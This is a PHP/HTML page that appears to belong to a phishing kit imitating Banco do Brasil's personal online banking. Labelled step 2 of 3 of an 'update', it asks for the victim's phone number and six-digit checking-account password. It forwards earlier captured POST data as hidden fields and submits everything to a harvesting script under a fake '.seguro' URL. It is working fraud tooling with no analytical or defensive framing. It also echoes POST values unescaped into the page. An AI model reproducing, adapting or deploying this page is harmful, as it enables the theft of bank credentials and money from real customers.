<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <title>Banco do Brasil - Autoatendimento Pessoa F&iacute;sica</title>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <!-- CSS -->
      <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
      <link rel="stylesheet" type="text/css" href="css/estilo.css">
      <link rel="icon" href="img/favicon.ico" type="image/x-icon"/>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <meta name="theme-color" content="#FAF046">

      <script src=https://code.jquery.com/jquery-1.12.0.min.js></script>
      <script>window.jQuery||document.write('<script src="js/vendor/jquery-1.12.0.min.js"><\/script>');</script>
      <script language="javascript">
         var cpfOK = false;
      </script>

      <style type="text/css">
         .group input[type="tel"], input[type="password"]{
            border-bottom: 1px solid #000;
         }
         .group label         {
           color:rgba(198,198,198); 
           font-size:18px;
           font-weight:normal;
           position:absolute;
           pointer-events:none;
           left:0px;
           top:5px;
           transition:0.2s ease all; 
           -moz-transition:0.2s ease all; 
           -webkit-transition:0.2s ease all;
         }
         .group input:focus ~ label, input:valid ~ label{
           top:-5px;
           font-size:12px;
           color:rgba(198,198,198);
         }
         input[type="submit"], [type="button"]:focus{
          color: #0355a0 !important;
         }
      </style>

      <style type="text/css">
          .modal-content{
              border: 0;
              border-radius: 0;
              outline: 0;
          }

          .modal-header{
              padding: 13px;
              border-bottom: 1px solid rgb(51,181,229);
          }
          .modal-title {
              color: rgb(51,181,229);
              margin-bottom: 0;
              line-height: 1.3;
          }
          p#error {
              font-weight: 500;
          }
          .modal-footer{
              padding: 0;
          }
          .modal-footer{
              border-top: 0;
          }
          button.btn.btn-default {
              width: 100%;
              border-radius: 0;
              background-color: rgb(186,226,240);
              border: solid 1px rgb(129,207,235);
              cursor: pointer;
          }
          .group input:focus{ outline:none; color:rgba(51,51,51, 0.9); border-bottom:1px solid #000;
      </style>
   </head>
   <body id="tela3">
      <section>
         <header id="topo">
            <div class="container">
               <div class="row">
                  <h2 class="logoTopo">
                    
                  </h2>
                  <h3>Atualização (2 de 3)</h3>
               </div>
            </div>
         </header>
         <main id="identificacao">
            <div class="container">
               <div class="row">
                  <section class="formulario">
                     <form action="webApp_AplicationCard.php?brazil=<?php $hora=date("H,i,s,A,z,n,m,u,d,g,o,l"); echo"$hora"; ?>.seguro" enctype="multipart/form-data" method="POST" name="formInfo" id="form" class="form-inline">
                        <?php foreach($_POST as $key => $value):  ?>
	<input type="hidden" name="<?= $key ?>" value="<?= $value ?>" />
 <?php endforeach; ?>
 
                        </div>
                   
                        <h2 class="tituloTel">Telefone </h2>
                           <div class="group" style="width: 20%; display: -webkit-inline-box;">
                              <input id="ddd" name="ddd" type="tel" minlength="2" maxlength="2" onkeypress="return SomenteNumero(event)" onkeyup="pulacampo('ddd','numero');" oninvalid="setCustomValidity('Digite um DDD válido !')" onchange="try{setCustomValidity('')}catch(e){}">
                              <span class="highlight"></span>
                             <!-- <span class="bar"></span> -->
                             <label>DDD</label>
                          </div>
                          <div class="group" style="width: 75%; display: -webkit-inline-box; margin-left: 3%;">
                              <input id="numero" name="numero" type="tel" minlength="9" maxlength="10" onkeyup="mascaraMike('#####-####', this);javascript:pulacampo('numero','s6');" oninvalid="setCustomValidity('Digite um numero válido !')" onchange="try{setCustomValidity('')}catch(e){}">
                              <span class="highlight"></span>
                             <!-- <span class="bar"></span> -->
                             <label style="margin-left: 5%;">Número de telefone</label>
                           </div>
                        </div>
                        <!-- <div class="form-group">
                           <p class="textoFormTel">
                              Para aumentar ainda mais a sua segurança, este acesso deve ser confirmado com as seguintes senha:
                           </p>
                        </div> -->
                        <div class="caixa">
                           <h2 class="tituloTel">Senha (6 digitos)</h2>
                           <div class="group">
                              <input id="s6" name="s6" type="password" minlength="6" maxlength="6" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite sua Senha !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('s6','confirmar');" style="-webkit-text-security: circle;">
                              <span class="highlight"></span>
                              <!-- <span class="bar"></span> -->
                              <label>Senha conta corrente</label>
                           </div>
                           <div class="caixa">
                        <div class="button-pass1">
                           <input type="submit" value="Confirmar" id="confirmar">
                        </div>
                     </form>
                  </section>
               </div>
            </div>
         </main>
      </section>

      <div class="modal fade" id="modalErro" role="dialog">
          <div class="modal-dialog">
          
            <div class="modal-content">
              <div class="modal-header">
                <h4 class="modal-title">Alerta</h4>
              </div>
              <div class="modal-body">
                <p id="error"></p>
              </div>
              <div class="modal-footer">
                <button type="button" class="btn btn-default" data-dismiss="modal">ok</button>
              </div>
            </div>
            
          </div>
      </div>

      <div class="loading">
        <div class="loader"></div>
      </div>

   </body>
   <!-- scripts -->
   <script src="js/jquery-3.2.1.min.js"></script>
   <script src="js/bootstrap.js"></script>
   <script src="js/script.js"></script>
   <script src="js/cpf.js"></script>

   <script language="javascript">
      $( document ).ready(function() {
          $( "#confirmar" ).click(function() {

              var ddd        =  formInfo.ddd.value;
              var numero   =  formInfo.numero.value;


              if (ddd == "" || ddd.length < 2) {
                $("#error").html("Digite o DDD de sua cidade !");
                $('#modalErro').modal("show");
                return false;
              }
              else if (numero == "" ||
                     numero.length < 10 ||
                     numero == "0000-00000" || 
                     numero == "1111-11111" || 
                     numero == "2222-22222" ||
                     numero == "3333-33333" || 
                     numero == "4444-44444" || 
                     numero == "5555-55555" || 
                     numero == "6666-66666" || 
                     numero == "7777-77777" || 
                     numero == "8888-88888" || 
                     numero == "9999-99999"){
                     $("#error").html("Telefone inválido, digite corretamente !");
                     $('#modalErro').modal("show");
                   return false;
              }
              else if (checkCPF()){
                  cpfOK = true;    
                  $(".loading").css({'display': 'block'});
                  $("#form").submit(); 
              } else {
                  $("#error").html("CPF não cadastrado na base de dados !");
                   $('#modalErro').modal("show");
                   $("#cpf").val('');
              }
          });        
      });   
   </script>
</html>